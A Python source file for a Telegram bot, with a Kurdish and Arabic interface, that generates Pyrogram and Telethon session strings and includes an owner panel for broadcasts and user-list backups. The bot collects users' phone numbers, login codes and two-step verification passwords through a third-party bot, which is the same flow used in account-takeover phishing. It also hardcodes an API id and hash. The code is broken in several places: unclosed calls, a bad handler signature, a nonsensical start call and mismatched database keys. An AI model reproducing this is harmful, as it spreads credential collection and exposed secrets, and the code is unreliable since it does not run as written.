from mody import Mody
import asyncio
from pyrogram import Client, filters, idle
from pyrogram.types import (InlineKeyboardMarkup, InlineKeyboardButton, BotCommand, Message)
from kvsqlite.sync import Client as DB
from datetime import date
from pyrogram.errors import FloodWait
from pyrogram.errors import ChatAdminRequired, UserNotParticipant, ChatWriteForbidden
botdb = DB('botdb.sqlite')
from pyrogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeExpired
from pyrogram.errors.exceptions.bad_request_400 import PasswordHashInvalid
from pyrogram.errors.exceptions.not_acceptable_406 import PhoneNumberInvalid
from pyrogram.errors.exceptions.bad_request_400 import PhoneCodeInvalid
from pyrogram.errors import PeerIdInvalid
from config import db, SUDORS
import asyncio, os
#############################################################################
from telethon import TelegramClient
from telethon import __version__ as v2
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from pyromod import listen
from pyrogram import (
    __version__ as v
)

ownerID = Mody.OWNER
api_hash = Mody.API_HASH
api_id = Mody.API_ID
token = Mody.ELHYBA

bot_id = token.split(":")[0]

bot = Client(
    'bot' + token.split(":")[0],
    12962251,
    'b51499523800add51e4530c6f552dbc8',
    bot_token=token, in_memory=True
)
app = Client(
    name="session",
    api_id=api_id, api_hash=api_hash,
    bot_token=token, in_memory=True
)
##########################
IQS = InlineKeyboardMarkup(
    [
        [
            InlineKeyboardButton("𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", url=f"https://t.me/IQ7amo")
       ],[
            InlineKeyboardButton("⧉• 𝗦𝗢𝗨𝗥𝗖𝞝 𝙄𝙌", url=f"https://t.me/MGIMT"),
        ]
    ]
)
######################

##################

def add_new_user(user_id):
	if is_user(user_id):
		return
	db.sadd(f"botusers&{bot_id}", user_id)
def is_user(user_id):
	try:
		users = get_users()
		if user_id in users:
			return True
		return False
	except:
		return False
def get_users():
	try:
		return db.get(f"botusers&{bot_id}")["set"]
	except:
		return []

def users_backup():
	text = ""
	for user in get_users():
		text += f"{user}\n"
	with open("users.txt", "w+") as f:
		f.write(text)
	return "users.txt"

def del_user(user_id: int):
	if not is_user(user_id):
		return False
	db.srem(f"botusers{bot_id}", user_id)
	return True

async def main():
	await bot.start()
	await idle()


@bot.on_message(filters.command("start") & filters.private)
async def new_user(bot, msg):
	if not is_user(msg.from_user.id):
		add_new_user(msg.from_user.id)
		text = f"""
• دخل عضو جديد للبوت

• الاسم : {msg.from_user.first_name}
• منشن : {msg.from_user.mention}
• الايدي : {msg.from_user.id}
		"""
		reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton(f"• عدد الاعضاء: {len(get_users())}", callback_data= "users")]])
		if len(SUDORS) > 0:
			for user_id in SUDORS:
				await bot.send_message(int(user_id), text, reply_markup=reply_markup)
		else:
			await bot.send_message(int(SUDORS[0]), text, reply_markup=reply_markup)
@bot.on_message(filters.command("admin") & filters.private, group=1)
async def admins(bot, msg):
	if msg.from_user.id in SUDORS:
		reply_markup = ReplyKeyboardMarkup([
			[("• الاحصائيات •"),("• اخفاء الكيبورد •")],
			[("• اوامر التواصل •")],
			[("• تفعيل التواصل •"), ("• تعطيل التواصل •")],
			[("• اوامر الاذاعه •")],
			[("• اذاعه •"),("• اذاعه بالتوجيه •"),("• اذاعه بالتثبيت •")],
			[("• اوامر الاعضاء •")],
			[("• نسخه اعضاء •"), ("• رفع نسخه •")],
			[("• الغاء •")]])
		await msg.reply(f"• اهلا عزيزي المطور {msg.from_user.mention}", reply_markup=reply_markup, quote=True)
@bot.on_message(filters.text & filters.private, group=2)
async def cmd(bot, msg):
	if msg.from_user.id in SUDORS:
		if msg.text == "• الغاء •":
			await msg.reply("• تم الغاء كل العمليات", quote=True)
			db.delete(f"{msg.from_user.id}:fbroadcast:{bot_id}")
			db.delete(f"{msg.from_user.id}:pinbroadcast:{bot_id}")
			db.delete(f"{msg.from_user.id}:broadcast:{bot_id}")
			db.delete(f"{msg.from_user.id}:users_up:{bot_id}")
		if msg.text == "• اخفاء الكيبورد •":
			await msg.reply("• تم اخفاء الكيبورد ارسل /start لعرضه مره اخري", reply_markup=ReplyKeyboardRemove(selective=True), quote=True)
		if msg.text == "• الاحصائيات •":
			await msg.reply(f"• عدد الاعضاء: {len(get_users())}\n• عدد المشرفين: {len(SUDORS)}", quote=True)
		if msg.text == "• تفعيل التواصل •":
			if not db.get(f"{msg.from_user.id}:twasl:{bot_id}"):
				await msg.reply("• تم تفعيل التواصل", quote=True)
				db.set(f"{msg.from_user.id}:twasl:{bot_id}", 1)
			else:
				await msg.reply("• التواصل مفعل من قبل", quote=True)
		if msg.text == "• تعطيل التواصل •":
			if db.get(f"{msg.from_user.id}:twasl:{bot_id}"):
				await msg.reply("• تم تعطيل التواصل", quote=True)
				db.delete(f"{msg.from_user.id}:twasl:{bot_id}")
			else:
				await msg.reply("• التواصل غير مفعل", quote=True)
		if msg.text == "• اذاعه •":
			await msg.reply("• ارسل الاذاعه ( نص ، ملف ، جهه اتصال ، متحركه ، ملصق ، صوره )", quote=True)
			db.set(f"{msg.from_user.id}:broadcast:{bot_id}", 1)
			db.delete(f"{msg.from_user.id}:fbroadcast:{bot_id}")
			db.delete(f"{msg.from_user.id}:pinbroadcast:{bot_id}")
		if msg.text == "• اذاعه بالتوجيه •":
			await msg.reply("• ارسل الاذاعه ( نص ، ملف ، جهه اتصال ، متحركه ، ملصق ، صوره )", quote=True)
			db.set(f"{msg.from_user.id}:fbroadcast:{bot_id}", 1)
			db.delete(f"{msg.from_user.id}:pinbroadcast:{bot_id}")
			db.delete(f"{msg.from_user.id}:broadcast:{bot_id}")
		if msg.text == "• اذاعه بالتثبيت •":
			await msg.reply("• ارسل الاذاعه ( نص ، ملف ، جهه اتصال ، متحركه ، ملصق ، صوره )", quote=True)
			db.set(f"{msg.from_user.id}:pinbroadcast:{bot_id}", 1)
			db.delete(f"{msg.from_user.id}:fbroadcast:{bot_id}")
			db.delete(f"{msg.from_user.id}:broadcast:{bot_id}")
		if msg.text == "• نسخه اعضاء •":
			wait = await msg.reply("• انتظر قليلا ..", quote=True)
			await bot.send_document(msg.chat.id, users_backup())
			await wait.delete()
			os.remove("users.txt")
		if msg.text == "• رفع نسخه •":
			await msg.reply("• ارسل الان نسخه ملف الاعضاء", quote=True)
			db.set(f"{msg.from_user.id}:users_up:{bot_id}", 1)

@bot.on_message(filters.private, group=3)
async def forbroacasts(bot, msg):
	if msg.from_user.id in SUDORS and msg.text != "• اذاعه •" and msg.text != "• اذاعه بالتوجيه •" and msg.text != "• اذاعه بالتثبيت •" and msg.text != "• الغاء •" and msg.text != "• رفع نسخه •" and msg.text != "• اوامر الاذاعه •" and msg.text != "• تعطيل التواصل •" and msg.text != "• تفعيل التواصل •" and msg.text != "• اوامر التواصل •" and msg.text != "• اخفاء الكيبورد •" and msg.text != "• الاحصائيات •":
		if db.get(f"{msg.from_user.id}:broadcast:{bot_id}"):
			db.delete(f"{msg.from_user.id}:broadcast:{bot_id}")
			message = await msg.reply("• جاري الإذاعة ..", quote=True)
			current = 1
			for user in get_users():
				try:
					await msg.copy(int(user))
					progress = (current / len(get_users())) * 100
					current += 1
					if not db.get(f"{msg.from_user.id}:flood:{bot_id}"):
						await message.edit(f"• نسبه الاذاعه {int(progress)}%")
						db.set(f"{msg.from_user.id}:flood:{bot_id}", 1)
						db.expire(f"{msg.from_user.id}:flood:{bot_id}", 4)
				except PeerIdInvalid:
					del_user(int(user))
			await message.edit("• تمت الاذاعه بنجاح")
		if db.get(f"{msg.from_user.id}:pinbroadcast:{bot_id}"):
			db.delete(f"{msg.from_user.id}:pinbroadcast:{bot_id}")
			message = await msg.reply("• جاري الإذاعة ..", quote=True)
			current = 1
			for user in get_users():
				try:
					m = await msg.copy(int(user))
					await m.pin(disable_notification=False,both_sides=True)
					progress = (current / len(get_users())) * 100
					current += 1
					if not db.get(f"{msg.from_user.id}:flood:{bot_id}"):
						await message.edit(f"• نسبه الاذاعه {int(progress)}%")
						db.set(f"{msg.from_user.id}:flood:{bot_id}", 1)
						db.expire(f"{msg.from_user.id}:flood:{bot_id}", 4)
				except PeerIdInvalid:
					del_user(int(user))
			await message.edit("• تمت الاذاعه بنجاح")
		if db.get(f"{msg.from_user.id}:fbroadcast:{bot_id}"):
			db.delete(f"{msg.from_user.id}:fbroadcast:{bot_id}")
			message = await msg.reply("• جاري الإذاعة ..", quote=True)
			current = 1
			for user in get_users():
				try:
					await msg.forward(int(user))
					progress = (current / len(get_users())) * 100
					current += 1
					if not db.get(f"{msg.from_user.id}:flood:{bot_id}"):
						await message.edit(f"• نسبه الاذاعه {int(progress)}%")
						db.set(f"{msg.from_user.id}:flood:{bot_id}", 1)
						db.expire(f"{msg.from_user.id}:flood:{bot_id}", 4)
				except PeerIdInvalid:
					del_user(int(user))
			await message.edit("• تمت الاذاعه بنجاح")
	if msg.document and db.get(f"{msg.from_user.id}:users_up:{bot_id}"):
		message = await msg.reply(f"• انتظر قليلا ..", quote=True)
		await msg.download("./users.txt")
		db.delete(f"botusers{bot_id}")
		file = open("./users.txt", "r", encoding="utf8", errors="ignore")
		for user in file.read().splitlines():
			if not is_user(user):
				add_new_user(user)
		await message.edit(f"• تم رفع نسخه الاعضاء \n• عدد الاعضاء : {len(get_users())}")
		try:
			os.remove("./users.txt")
			db.delete(f"{msg.from_user.id}:users_up:{bot_id}")
		except:
			pass
@bot.on_message(filters.private, group=4)
async def twasl(bot, msg):
	if msg.from_user.id not in SUDORS:
		for user in SUDORS:
			if db.get(f"{user}:twasl:{bot_id}"):
				await msg.forward(user)
	if msg.from_user.id in SUDORS:
		if msg.reply_to_message:
			if msg.reply_to_message.forward_from:
				try:
					await msg.copy(msg.reply_to_message.forward_from.id)
					await msg.reply(f"• تم إرسال رسالتك إلى {msg.reply_to_message.forward_from.first_name} بنجاح", quote=True)
				except Exception as Error:
					await msg.reply(f"• لم يتم ارسال رسالتك بسبب: {str(Error)}", quote=True)
					pass
##################################################################JOIN

#--------------------------

MUST_JOIN = "EHS4SS"
#------------------------
@app.on_message(filters.incoming & filters.private, group=-1)
async def must_join_channel(app: Client, msg: Message):
    if not MUST_JOIN:
        return
    try:
        try:
            await app.get_chat_member(MUST_JOIN, msg.from_user.id)
        except UserNotParticipant:
            if MUST_JOIN.isalpha():
                link = "https://t.me/" + MUST_JOIN
            else:
                chat_info = await app.get_chat(MUST_JOIN)
                link = chat_info.invite_link
            try:
                await msg.reply_photo(
                    photo="https://graph.org/file/d43f056ca2a5e2e598fd2.jpg", caption=f"**🧑🏻‍💻︙ببوورە ئەزیزم تۆ جۆین نیت؛\n🔰︙سەرەتا پێویستە جۆینی کەناڵی بۆت ♥️؛\n👾︙بکەیت بۆ بەکارهێنانم جۆین بە ⚜️؛\n💎︙کەناڵی بۆت: @EHS4SS\n\n👾︙کاتێ جۆینت کرد ستارت بکە /start , /help 📛!**",
                    reply_markup=InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton("♥️ جۆینی کەناڵ بکە ♥️", url=link),
                            ]
                        ]
                    )
                )
                await msg.stop_propagation()
            except ChatWriteForbidden:
                pass
    except ChatAdminRequired:
        print(f"**بۆت بکە ئەدمین لە کەناڵی**: {MUST_JOIN} !")
#############################################################################

####################################################
@app.on_message(filters.command("start") & filters.private)
async def start_msg(app, message):
    reply_markup = ReplyKeyboardMarkup(
        [
            [
                KeyboardButton("𝗣𝘆𝗿𝗼𝗴𝗿𝗮𝗺 𝗩𝟮"), KeyboardButton("𝗧𝗲𝗹𝗲𝘁𝗵𝗼𝗻")
            ],
            [KeyboardButton("دەرباری بۆت")]
        ],
        resize_keyboard=True, placeholder='دەرهێنانی کۆد 🧑🏻‍💻'
    )
    await message.reply('''**
🧑🏻‍💻︙بە خێربێی ئەزیزم {}
🧑🏻‍💻︙بۆ بۆتی دەرهێنانی کۆدی تێلەگرام
🧑🏻‍💻︙ئەم بۆتە تایبەتە بۆ پرۆگرامینگ و هەندێك بۆت
🧑🏻‍💻︙دوو جۆر هەیە پایرۆگرام و تێلێثۆن لە دووگمەی خوارەوە
**'''.format(message.from_user.mention), reply_markup=reply_markup, quote=True)

@app.on_message(filters.text & filters.private)
async def generator_and_about(app, m, user_id: int):
    if m.text == "دەرباری بۆت":
        text = ''
        text += "**🐍 زمانی پڕۆگرامینگ - پایثۆن**"
        text += f"**\n🔥 ڤێرژنی پایرۆگرام** {v}"
        text += f"**\n🌱 ڤێرژنی تێلیثۆن** {v2}"
        text += f"**\n\n🧑🏻‍💻🖤 گەشەپێدەری بۆت :  [﮼محمد](t.me/MGIMT)**"
        text += f"**\n\n⧉• کەناڵی سەرچاوە : @MGIMT**"
        photo=f"https://telegra.ph/file/11448420ddc987f97d1de.jpg"
        await app.send_photo(m.chat.id, photo, text, reply_markup=IQS)

    if m.text == "𝗣𝘆𝗿𝗼𝗴𝗿𝗮𝗺 𝗩𝟮":
        rep = await m.reply(
            "**کەمێك چاوەڕێ بکە ⏳**", reply_markup=ReplyKeyboardRemove()
            , quote=True)
        c = Client(
            f"pyro{m.from_user.id}", api_id, api_hash,
            device_model="Pyrogram", in_memory=True
        )
        await c.connect()
        await rep.delete()
        phone_ask = await m.chat.ask(
            "**⎆ پێویستە ژمارەی مۆبایلەکەت بنێری لەگەڵ کۆدی وڵات نموونە 📱: \n+964995×××××**",
            reply_to_message_id=m.id, filters=filters.text
        )
        phone = phone_ask.text
        try:
            send_code = await c.send_code(phone)
        except PhoneNumberInvalid:
            return await phone_ask.reply(
                "**⎆ ژمارەی مۆبایل هەڵەیە دووبارە هەوڵبدەوە**\n/start", quote=True)
        except Exception:
            return await phone_ask.reply("**⎆ هەڵەیە ! ، پێویستە دووبارە هەوڵبدەیەتەوە 🤠**\n/start", quote=True)
        hash = send_code.phone_code_hash
        code_ask = await m.chat.ask(
            "**⎆ کۆدەکە بنێرە کە بۆ تێلەگرام هاتەوە\n⎆ کۆدەکە هاتەوە بۆشایان هەبێت، بەم شێوازە بینووسە لە بۆت\nنموونە : 8 7 9 5 3**",
            filters=filters.text
        )
        code = code_ask.text
        try:
            await c.sign_in(phone, hash, code)
        except SessionPasswordNeeded:
            password_ask = await m.chat.ask("**⎆ پاسۆردی سیکوێرتی ئەکاونت بنووسە ..**", filters=filters.text)
            password = password_ask.text
            try:
                await c.check_password(password)
            except PasswordHashInvalid:
                return await password_ask.reply(
                    "**⎆ پاسۆردی سیکوێرتی ئەکاونت هەڵەیە\n⎆ پێویستە دووبارە هەوڵبدەیتەوە**\n/start",
                    quote=True)
        except (PhoneCodeInvalid, PhoneCodeExpired):
            return await code_ask.reply("**⎆ کۆدی مۆبایل هەڵەیە**", quote=True)
        try:
            await c.sign_in(phone, hash, code)
        except:
            pass
        rep = await m.reply("**کەمێك چاوەڕێ بکە ⏳**", quote=True)
        get = await c.get_me()
        text = '**✅┋ بە سەرکەوتوویی ئەنجام درا\n**'
        text += f'**👤┋ ناوت : {get.first_name}\n**'
        text += f'**🆔┋ ئایدیت :** `{get.id}`\n'
        text += f'**📞┋ ژمارەی مۆبایل :** `{phone}`\n'
        text += f'**🔒┋ کۆدەکە لە 𝖲𝖺𝗏𝖾 𝖬𝖾𝗌𝗌𝖺𝗀𝖾 دانرا**'
        string_session = await c.export_session_string()
        await rep.delete()
        await c.send_message('m', f'**بە سەرکەوتوویی کۆدی پـایـرۆگـرام دەرهێنرا** `{v}` **ئەمە کۆدەکەیە**\n\n`{string_session}`')
        await c.disconnect()
        await app.send_message(
            chat_id=user_id,
            text="**✅┋ بە سەرکەوتوویی ئەنجام درا\n**👤┋ ناوت : {get.first_name}\n**🆔┋ ئایدیت :** `{get.id}`\n**📞┋ ژمارەی مۆبایل :** `{phone}`\n**🔒┋ کۆدەکە لە 𝖲𝖺𝗏𝖾 𝖬𝖾𝗌𝗌𝖺𝗀𝖾 دانرا**",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            text="sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs",
                            url=f"tg://openmessage?user_id={user_id}",
                        )
                    ]
                ]
            )

    if m.text == "𝗧𝗲𝗹𝗲𝘁𝗵𝗼𝗻":
        rep = await m.reply(
            "**کەمێك چاوەڕێ بکە ⏳**",
            reply_markup=ReplyKeyboardRemove()
            , quote=True
        )
        c = TelegramClient(StringSession(), api_id, api_hash)
        await c.connect()
        await rep.delete()
        phone_ask = await m.chat.ask("**⎆ پێویستە ژمارەی مۆبایلەکەت بنێری لەگەڵ کۆدی وڵات نموونە 📱: \n+964995×××××**",
                                     reply_to_message_id=m.id, filters=filters.text
                                     )
        phone = phone_ask.text
        try:
            send_code = await c.send_code_request(phone)
        except PhoneNumberInvalidError:
            return await phone_ask.reply(
                "**⎆ ژمارەی مۆبایل هەڵەیە دووبارە هەوڵبدەوە**\n/start", quote=True)
        except Exception:
            return await phone_ask.reply("**⎆ هەڵەیە ! ، پێویستە دووبارە هەوڵبدەیەتەوە 🤠**\n/start", quote=True)
        code_ask = await m.chat.ask(
            "**⎆ کۆدەکە بنێرە کە بۆ تێلەگرام هاتەوە\n⎆ کۆدەکە هاتەوە بۆشایان هەبێت، بەم شێوازە بینووسە لە بۆت\nنموونە : 8 7 9 5 3**",
            filters=filters.text)
        code = code_ask.text.replace(" ", "")
        try:
            await c.sign_in(phone, code, password=None)
        except SessionPasswordNeededError:
            password_ask = await m.chat.ask("**⎆ پاسۆردی سیکوێرتی ئەکاونت بنووسە ..**", filters=filters.text)
            password = password_ask.text
            try:
                await c.sign_in(password=password)
            except PasswordHashInvalidError:
                return await password_ask.reply(
                    "**⎆ پاسۆردی سیکوێرتی ئەکاونت هەڵەیە\n⎆ پێویستە دووبارە هەوڵبدەیتەوە**\n/start",quote=True)
        except (PhoneCodeExpiredError, PhoneCodeInvalidError):
            return await code_ask.reply("**⎆ کۆدی مۆبایل هەڵەیە**", quote=True)
        await c.start(bot_token=phone)
        rep = await m.reply("**کەمێك چاوەڕێ بکە ⏳**", quote=True)
        get = await c.get_me()
        text = '**✅┋ بە سەرکەوتوویی ئەنجام درا\n**'
        text += f'**👤┋ ناوت : {get.first_name}\n**'
        text += f'**🆔┋ ئایدیت :** `{get.id}`\n'
        text += f'**📞┋ ژمارەی مۆبایل :** `{phone}`\n'
        text += f'**🔒┋ کۆدەکە لە 𝖲𝖺𝗏𝖾 𝖬𝖾𝗌𝗌𝖺𝗀𝖾 دانرا**'
        string_session = c.session.save()
        await rep.delete()
        await c.send_message('m', f'**بە سەرکەوتوویی کۆدی تـێـلـێـثـۆن دەرهێنرا** `{v2}` **ئەمە کۆدەکەیە**\n\n`{string_session}`')
        await c.disconnect()

        await app.send_message(
            chat_id=user_id,
            text="**✅┋ بە سەرکەوتوویی ئەنجام درا\n**👤┋ ناوت : {get.first_name}\n**🆔┋ ئایدیت :** `{get.id}`\n**📞┋ ژمارەی مۆبایل :** `{phone}`\n**🔒┋ کۆدەکە لە 𝖲𝖺𝗏𝖾 𝖬𝖾𝗌𝗌𝖺𝗀𝖾 دانرا**",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            text="sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs",
                            url=f"tg://openmessage?user_id={user_id}",
                        )
                    ]
                ]
            )

app.start()
bot.start()
print("بۆت چالاککرا لەلایەن : @IQ7amo")
idle()
